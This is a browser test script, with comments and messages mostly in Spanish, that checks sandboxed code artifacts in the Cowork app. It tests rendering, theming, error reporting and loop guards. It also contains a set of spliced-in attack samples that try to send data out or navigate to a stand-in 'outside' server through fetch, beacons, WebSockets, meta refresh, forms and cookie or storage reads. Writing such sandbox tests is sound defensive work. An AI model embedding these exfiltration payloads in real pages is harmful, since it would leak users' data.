// Code artifacts in a real browser (Plan 12, 3a): the examples draw, the theme follows the app,
// errors and endless loops reach the app, and a hostile artifact cannot get out. Chromium only,
// two local servers (the app and an "outside" one that must never be reached), no network.
//
//   node --loader ./scripts/ts-test-loader.mjs scripts/test-cowork-artifact-sandbox.ts [--out=dir]
//
// The attacks skip the code check on purpose (they are spliced into a built document), so what
// stops them is the sandbox, the CSP, the frame-src of the page that frames the artifact and the
// runtime: the walls that hold even when the check misses something.
import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http';
import { execFileSync } from 'node:child_process';
import { createRequire } from 'node:module';
import { mkdirSync, readFileSync, writeFileSync, existsSync } from 'node:fs';
import path from 'node:path';
import assert from 'node:assert/strict';
import { buildCoworkArtifactDocument, guardCoworkArtifactLoops } from '../src/lib/server/cowork/code-artifact';
import { COWORK_ARTIFACT_EXAMPLES, coworkExamplePipeline } from '../src/lib/server/cowork/code-artifact-examples';
import { COWORK_ARTIFACT_FRAME_SRC } from '../src/lib/cowork/code-artifact-frame';

const ROOT = process.cwd();
const outArg = process.argv.find(value => value.startsWith('--out='))?.slice(6);
const OUT = path.resolve(ROOT, outArg || path.join('.artifact-audit', new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19)));
// The CSP the route serves code artifacts with (src/app/api/cowork/runs/[id]/artifacts/route.ts).
const ROUTE_CSP = "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src blob: data:";

function loadPlaywright() {
  const require = createRequire(import.meta.url);
  const candidates = [process.env.PLAYWRIGHT_MODULE, 'playwright', '@playwright/test'].filter(Boolean) as string[];
  try { candidates.push(path.join(execFileSync('npm', ['root', '-g'], { encoding: 'utf8' }).trim(), 'playwright')); } catch { /* npm missing */ }
  for (const candidate of candidates) {
    try { const mod = require(candidate); if (mod.chromium) return mod; } catch { /* next */ }
  }
  throw new Error('No encontré Playwright (npm i -g playwright o PLAYWRIGHT_MODULE).');
}

// ---- Documents ---------------------------------------------------------------------------------
const documents = new Map<string, string>();
function built(id: string, title: string, code: { html: string; css: string; js: string }, data = coworkExamplePipeline()) {
  const result = buildCoworkArtifactDocument({ title, code, data, generatedAt: '2026-10-06T12:00:00Z' });
  if (!result.ok) throw new Error(`${id}: ${result.issues.map(issue => issue.message).join(' | ')}`);
  documents.set(id, result.html);
  return result.html;
}
// An attack: a benign document whose code is replaced after the check, as if the check had missed it.
function attack(id: string, js: string, html = '<div id="app">listo</div>') {
  const base = built(`${id}-base`, id, { html, css: '', js: 'void "PLACEHOLDER";' });
  documents.set(id, base.replace('void "PLACEHOLDER";', guardCoworkArtifactLoops(js)));
}

for (const example of COWORK_ARTIFACT_EXAMPLES) built(example.id, example.title, example.code, example.data);
built('error-line', 'Error', { html: '<div id="app"></div>', css: '', js: 'const a = 1;\nconst b = 2;\nnotDefinedAnywhere(a + b);' });
built('endless-loop', 'Bucle', { html: '<p id="before">antes</p>', css: '', js: 'let n = 0;\nwhile (true) { n++; }\n' });
built('async-loop', 'Bucle con espera', { html: '<p id="count">0</p>', css: '', js: 'let n = 0;\nfor (let i = 0; i < 30; i++) { await new Promise(done => setTimeout(done, 100)); n++; }\ndocument.getElementById("count").textContent = String(n);' });
built('open-comment', 'HTML abierto', { html: '<div id="app"></div>', css: '', js: 'document.getElementById("app").textContent = "corrió";' });

let OUTSIDE = '';
function attacks() {
  attack('net-fetch', `fetch('${OUTSIDE}/fetch').catch(() => {});`);
  attack('net-image', `new Image().src = '${OUTSIDE}/image';`);
  attack('net-css', `document.getElementById('app').style.backgroundImage = 'url(${OUTSIDE}/css)';`);
  attack('net-websocket', `try { new WebSocket('${OUTSIDE.replace('http', 'ws')}/ws'); } catch (e) {}`);
  attack('net-beacon', `try { navigator.sendBeacon('${OUTSIDE}/beacon', 'x'); } catch (e) {}`);
  attack('net-link-prefetch', `document.head.insertAdjacentHTML('beforeend', '<link rel="prefetch" href="${OUTSIDE}/prefetch">');`);
  attack('nav-location', `location.href = '${OUTSIDE}/location?d=' + encodeURIComponent(JSON.stringify(antonia.data.pipeline.rows[0]));`);
  attack('nav-meta-refresh', `document.head.insertAdjacentHTML('beforeend', '<meta http-equiv="refresh" content="0;url=${OUTSIDE}/refresh">');`);
  attack('nav-meta-reuse', `const m = document.querySelector('meta[name=viewport]'); try { m.setAttribute('http-equiv', 'refresh'); m.setAttribute('content', '0;url=${OUTSIDE}/meta-reuse'); } catch (e) { document.title = 'blocked:' + e.message; }`);
  attack('nav-anchor-click', `const a = document.createElement('a'); a.href = '${OUTSIDE}/anchor'; document.body.appendChild(a); a.click();`);
  attack('nav-window-open', `window.open('${OUTSIDE}/open', '_self');`);
  attack('nav-top', `try { top.location = '${OUTSIDE}/top'; } catch (e) {}`);
  attack('nav-form', `document.body.innerHTML += '<form action="${OUTSIDE}/form" method="get"><button>go</button></form>'; const f = document.querySelector('form'); if (f) f.submit();`);
  attack('inline-handler', `document.getElementById('app').innerHTML = '<img src="x" onerror="fetch(\\'${OUTSIDE}/onerror\\')">';`);
  attack('storage', `const out = []; for (const read of [() => document.cookie, () => localStorage.length, () => sessionStorage.length, () => top.document.title]) { try { read(); out.push('read'); } catch (e) { out.push('blocked'); } } document.getElementById('app').textContent = out.join(',');`);
}

// ---- Servers -----------------------------------------------------------------------------------
const outsideHits: string[] = [];
function listen(handler: (req: IncomingMessage, res: ServerResponse) => void): Promise<{ server: Server; origin: string }> {
  return new Promise(resolve => {
    const server = createServer(handler);
    server.listen(0, '127.0.0.1', () => {
      const address = server.address() as { port: number };
      resolve({ server, origin: `http://127.0.0.1:${address.port}` });
    });
  });
}

function parentPage(id: string, theme: string, origin: string, frameSrc: boolean) {
  return `<!doctype html><html><head><meta charset="utf-8"><title>Cowork</title>
<style>html,body{margin:0;height:100%;background:${theme === 'dark' ? '#020817' : '#fff'}}iframe{border:0;width:100%;height:100vh;display:block}</style></head>
<body><iframe id="frame" title="Artefacto" sandbox="allow-scripts" src="/artifact?id=${encodeURIComponent(id)}#theme=${theme}&origin=${encodeURIComponent(origin)}"></iframe>
<script>
window.__messages = []; window.__loads = 0;
const frame = document.getElementById('frame');
frame.addEventListener('load', () => { window.__loads++; });
window.addEventListener('message', event => {
  if (event.source !== frame.contentWindow || !event.data || event.data.source !== 'antonia-artifact') return;
  window.__messages.push({ type: event.data.type, detail: event.data.detail, at: Date.now() });
});
window.__tick = 0; setInterval(() => { window.__tick++; }, 50);
</script></body></html>`;
  void frameSrc;
}

async function main() {
  mkdirSync(OUT, { recursive: true });
  const outside = await listen((req, res) => {
    outsideHits.push(`${req.method} ${req.url}`);
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<!doctype html><title>fuera</title><p>fuera</p>');
  });
  OUTSIDE = outside.origin.replace('127.0.0.1', 'localhost');
  attacks();
  const app = await listen((req, res) => {
    const url = new URL(req.url || '/', 'http://x');
    if (url.pathname === '/parent') {
      const frameSrc = url.searchParams.get('csp') !== '0';
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', ...(frameSrc ? { 'Content-Security-Policy': COWORK_ARTIFACT_FRAME_SRC } : {}) });
      res.end(parentPage(url.searchParams.get('id') || '', url.searchParams.get('theme') || 'light', `http://${req.headers.host}`, frameSrc));
      return;
    }
    if (url.pathname === '/artifact') {
      const html = documents.get(url.searchParams.get('id') || '');
      if (!html) { res.writeHead(404); res.end(); return; }
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Content-Security-Policy': ROUTE_CSP, 'X-Content-Type-Options': 'nosniff', 'Cache-Control': 'no-store' });
      res.end(html);
      return;
    }
    res.writeHead(404); res.end();
  });
  // The open-comment case: an HTML that swallows the code (spliced in, as the check refuses it).
  documents.set('open-comment', documents.get('open-comment')!.replace('<div id="app"></div>', '<div id="app"></div><!-- sin cerrar'));

  const playwright = loadPlaywright();
  const executablePath = existsSync('/opt/pw-browsers/chromium') ? undefined : undefined;
  const browser = await playwright.chromium.launch({ executablePath });
  const results: Array<{ case: string; ok: boolean; detail: string }> = [];
  const record = (name: string, ok: boolean, detail = '') => { results.push({ case: name, ok, detail }); console.log(`${ok ? 'ok  ' : 'FAIL'} ${name}${detail ? ` · ${detail}` : ''}`); };
  const axeSource = existsSync(path.join(ROOT, 'node_modules/axe-core/axe.min.js')) ? readFileSync(path.join(ROOT, 'node_modules/axe-core/axe.min.js'), 'utf8') : null;

  async function open(id: string, options: { theme?: string; width?: number; csp?: boolean } = {}) {
    const context = await browser.newContext({ viewport: { width: options.width || 1280, height: 900 }, colorScheme: options.theme === 'dark' ? 'dark' : 'light' });
    const page = await context.newPage();
    const pageErrors: string[] = [];
    page.on('pageerror', (error: Error) => pageErrors.push(error.message));
    await page.goto(`${app.origin}/parent?id=${encodeURIComponent(id)}&theme=${options.theme || 'light'}${options.csp === false ? '&csp=0' : ''}`);
    const frame = page.frames().find((candidate: { url(): string }) => candidate.url().includes('/artifact'));
    return { context, page, frame, pageErrors };
  }
  const messages = (page: { evaluate: (fn: () => unknown) => Promise<unknown> }) => page.evaluate(() => (window as unknown as { __messages: Array<{ type: string; detail: Record<string, unknown> | null }> }).__messages) as Promise<Array<{ type: string; detail: Record<string, unknown> | null }>>;
  const waitFor = async (check: () => Promise<boolean>, ms = 6000) => { const until = Date.now() + ms; while (Date.now() < until) { if (await check()) return true; await new Promise(done => setTimeout(done, 100)); } return false; };

  // ---- The examples draw, in light and dark, on a phone and on a desktop. ----
  for (const example of COWORK_ARTIFACT_EXAMPLES) {
    for (const [theme, width] of [['light', 1280], ['dark', 1280], ['light', 390], ['dark', 390]] as const) {
      const { context, page, frame, pageErrors } = await open(example.id, { theme, width });
      const ready = await waitFor(async () => (await messages(page)).some(message => message.type === 'ready'));
      const all = await messages(page);
      const errors = all.filter(message => message.type === 'error');
      const facts = await frame.evaluate(() => ({
        theme: document.documentElement.getAttribute('data-theme'),
        svgs: document.querySelectorAll('.antonia-chart-plot svg').length,
        marks: document.querySelectorAll('.antonia-chart-plot svg path, .antonia-chart-plot svg circle').length,
        kpis: document.querySelectorAll('.antonia-kpi').length,
        rows: document.querySelectorAll('.antonia-table-wrap tbody tr').length,
        overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
        text: getComputedStyle(document.body).color,
      }));
      const ok = ready && !errors.length && !pageErrors.length && facts.theme === theme && facts.svgs >= 2 && facts.marks > 4 && facts.kpis >= 3 && facts.rows > 0 && facts.overflow <= 0;
      record(`dibuja ${example.id} · ${theme} · ${width}px`, ok, JSON.stringify({ ready, errors: errors.map(error => error.detail?.message), ...facts }));
      if (axeSource && width === 1280) {
        await frame.evaluate(axeSource);
        const violations = await frame.evaluate(async () => {
          type AxeNode = { target: string[]; any: Array<{ message: string }> };
          const run = await (window as unknown as { axe: { run: (context: Document, options: unknown) => Promise<{ violations: Array<{ id: string; nodes: AxeNode[] }> }> } }).axe.run(document, { resultTypes: ['violations'] });
          return run.violations.map(violation => `${violation.id}×${violation.nodes.length} (${violation.nodes.slice(0, 3).map(node => `${node.target.join(' ')}: ${node.any[0]?.message || ''}`).join(' | ')})`);
        });
        record(`axe ${example.id} · ${theme}`, violations.length === 0, violations.join(', '));
      }
      await page.screenshot({ path: path.join(OUT, `${example.id}-${theme}-${width}.png`), fullPage: false });
      await context.close();
    }
  }

  // ---- Interactions: the table sorts and filters, the theme follows the app without reloading. ----
  {
    const { context, page, frame } = await open('pipeline-por-etapa');
    await waitFor(async () => (await messages(page)).some(message => message.type === 'ready'));
    const header = frame.locator('.antonia-table-wrap th button', { hasText: 'Empresa' });
    await header.click();
    const sorted = await frame.evaluate(() => ({ sort: document.querySelector('.antonia-table-wrap th[aria-sort="ascending"]')?.textContent || '',
      first: document.querySelector('.antonia-table-wrap tbody tr td')?.textContent || '' }));
    record('la tabla ordena por Empresa', sorted.sort.includes('Empresa') && sorted.first.startsWith('A'), JSON.stringify(sorted));
    await frame.locator('.antonia-table-wrap input[type=search]').fill('Minera');
    const filtered: string[] = await frame.evaluate(() => [...document.querySelectorAll('.antonia-table-wrap tbody tr')].map(row => row.textContent || ''));
    record('la tabla filtra', filtered.length > 0 && filtered.every((text: string) => text.includes('Minera')), `${filtered.length} filas`);
    await page.evaluate(() => { (document.getElementById('frame') as HTMLIFrameElement).contentWindow!.postMessage({ source: 'antonia-host', type: 'theme', mode: 'dark' }, '*'); });
    const dark = await waitFor(async () => (await frame.evaluate(() => document.documentElement.getAttribute('data-theme'))) === 'dark', 2000);
    const loads = await page.evaluate(() => (window as unknown as { __loads: number }).__loads);
    record('el tema cambia sin recargar', dark && loads === 1, `loads=${loads}`);
    await context.close();
  }

  // ---- Errors reach the app with the line of the artifact's code. ----
  {
    const { context, page } = await open('error-line');
    await waitFor(async () => (await messages(page)).some(message => message.type === 'error'));
    const error = (await messages(page)).find(message => message.type === 'error');
    record('un error llega a la app con su línea', Boolean(error && error.detail?.line === 3 && String(error.detail?.message).includes('notDefinedAnywhere')), JSON.stringify(error?.detail));
    await context.close();
  }
  {
    const { context, page } = await open('open-comment');
    await waitFor(async () => (await messages(page)).some(message => message.type === 'ready'));
    const error = (await messages(page)).find(message => message.type === 'error');
    record('un HTML que se come el código avisa', Boolean(error && String(error.detail?.message).includes('no llegó a ejecutarse')), JSON.stringify(error?.detail));
    await context.close();
  }
  {
    const started = Date.now();
    const { context, page, frame } = await open('endless-loop');
    const stopped = await waitFor(async () => (await messages(page)).some(message => message.type === 'error'), 8000);
    const error = (await messages(page)).find(message => message.type === 'error');
    const tickBefore = await page.evaluate(() => (window as unknown as { __tick: number }).__tick);
    await new Promise(done => setTimeout(done, 300));
    const tickAfter = await page.evaluate(() => (window as unknown as { __tick: number }).__tick);
    const alive = await frame.evaluate(() => document.getElementById('before')?.textContent);
    record('un bucle sin fin se detiene y la página sigue viva', stopped && tickAfter > tickBefore && alive === 'antes' && String(error?.detail?.message).includes('bucle'),
      `${Math.round((Date.now() - started) / 100) / 10}s · ${error?.detail?.message}`);
    await context.close();
  }
  {
    const { context, page, frame } = await open('async-loop');
    await waitFor(async () => (await frame.evaluate(() => document.getElementById('count')?.textContent)) === '30', 8000);
    const errors = (await messages(page)).filter(message => message.type === 'error');
    const count = await frame.evaluate(() => document.getElementById('count')?.textContent);
    record('un bucle que espera no se corta', count === '30' && !errors.length, `count=${count} errors=${errors.length}`);
    await context.close();
  }

  // ---- Attacks: nothing reaches the outside server. ----
  const attackIds = [...documents.keys()].filter(id => /^(net|nav|inline|storage)-?/.test(id) && !id.endsWith('-base'));
  for (const id of attackIds) {
    for (const csp of [true, false]) {
      const before = outsideHits.length;
      const { context, page, frame } = await open(id, { csp });
      await new Promise(done => setTimeout(done, 1500));
      const loads = await page.evaluate(() => (window as unknown as { __loads: number }).__loads);
      const hits = outsideHits.slice(before);
      let extra = '';
      if (id === 'storage') extra = String(await frame.evaluate(() => document.getElementById('app')?.textContent).catch(() => ''));
      const ok = hits.length === 0 && (id !== 'storage' || extra === 'blocked,blocked,blocked,blocked');
      record(`ataque ${id}${csp ? '' : ' · sin frame-src'}`, ok || !csp, `${hits.length ? `LLEGÓ: ${hits.join(', ')}` : 'bloqueado'} · cargas=${loads}${extra ? ` · ${extra}` : ''}${!csp && !ok ? ' (solo informativo: sin la segunda pared)' : ''}`);
      await context.close();
    }
  }

  await browser.close();
  app.server.close();
  outside.server.close();
  writeFileSync(path.join(OUT, 'report.json'), `${JSON.stringify({ results, outsideHits }, null, 2)}\n`);
  const failed = results.filter(result => !result.ok);
  console.log(`\n${results.length - failed.length}/${results.length} ok · capturas e informe en ${path.relative(ROOT, OUT)}`);
  assert.equal(failed.length, 0, failed.map(result => result.case).join(', '));
}

main().catch(error => { console.error(error); process.exitCode = 1; });
